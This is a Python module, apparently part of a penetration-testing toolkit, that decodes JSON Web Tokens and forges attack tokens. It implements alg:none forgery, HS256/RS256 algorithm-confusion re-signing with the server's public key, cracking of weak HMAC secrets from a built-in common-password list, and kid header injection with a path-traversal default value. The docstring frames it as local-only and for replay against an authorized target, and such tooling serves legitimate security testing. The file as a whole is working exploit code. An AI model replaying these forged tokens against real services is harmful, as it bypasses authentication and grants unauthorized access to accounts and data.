"""
JWT attacks (attack section improvement #3 — pure crypto, network-free).

Decodes a JWT and forges the classic test tokens: `alg:none`, HS/RS algorithm confusion (re-sign with
HS256 using the RSA public key as the HMAC secret), weak-secret recovery (over a SMALL common-secret
list — not a brute-force engine), and `kid`/`jku` header injection. All local crypto — no network. The
forged token is then replayed by the operator/executor against an AUTHORIZED target to prove the auth
bypass (PoC). Reads a token's claims; never exfiltrates.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Dict, List, Optional

COMMON_SECRETS = ["secret", "password", "123456", "jwt", "key", "admin", "changeme", "private",
                  "your-256-bit-secret", "secretkey", "jwtsecret", "supersecret", "token", "test"]


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _enc(obj: Dict) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":")).encode())


class JWTAnalyzer:
    def decode(self, token: str) -> Dict:
        h, p, sig = (token.split(".") + ["", "", ""])[:3]
        return {"header": json.loads(_b64url_decode(h)), "payload": json.loads(_b64url_decode(p)),
                "signature": sig}

    def forge_none(self, token: str, claims: Optional[Dict] = None) -> str:
        d = self.decode(token)
        hdr = {**d["header"], "alg": "none"}
        return f"{_enc(hdr)}.{_enc({**d['payload'], **(claims or {})})}."

    def forge_alg_confusion(self, token: str, public_key_pem: str,
                            claims: Optional[Dict] = None) -> str:
        """HS/RS confusion: re-sign HS256 using the server's RSA PUBLIC key as the HMAC secret."""
        d = self.decode(token)
        hdr = {**d["header"], "alg": "HS256"}
        signing = f"{_enc(hdr)}.{_enc({**d['payload'], **(claims or {})})}"
        sig = hmac.new(public_key_pem.encode(), signing.encode(), hashlib.sha256).digest()
        return f"{signing}.{_b64url(sig)}"

    def crack_weak_secret(self, token: str, secrets: Optional[List[str]] = None) -> Optional[str]:
        d = self.decode(token)
        if str(d["header"].get("alg", "")).upper() != "HS256":
            return None
        h, p, sig = token.split(".")
        signing = f"{h}.{p}"
        for sec in (secrets or COMMON_SECRETS):
            cand = _b64url(hmac.new(sec.encode(), signing.encode(), hashlib.sha256).digest())
            if hmac.compare_digest(cand, sig):
                return sec
        return None

    def inject_kid(self, token: str, value: str = "../../../../../dev/null") -> str:
        d = self.decode(token)
        parts = token.split(".")
        return f"{_enc({**d['header'], 'kid': value})}.{parts[1]}.{parts[2] if len(parts) > 2 else ''}"

    def analyze(self, token: str) -> Dict:
        try:
            d = self.decode(token)
        except Exception as e:
            return {"error": f"not a decodable JWT: {e}", "advisory": True}
        alg = str(d["header"].get("alg", "")).upper()
        weak = self.crack_weak_secret(token) if alg == "HS256" else None
        return {"header": d["header"], "claims": d["payload"], "alg": alg,
                "weak_secret": weak,
                "candidate_attacks": ([f"weak HMAC secret: '{weak}'"] if weak else [])
                + (["alg=none acceptance", "kid/jku injection"] if alg != "none" else [])
                + (["HS/RS algorithm confusion"] if alg.startswith("RS") else []),
                "note": "forge test tokens locally, then replay against the authorized target (PoC)",
                "advisory": True}
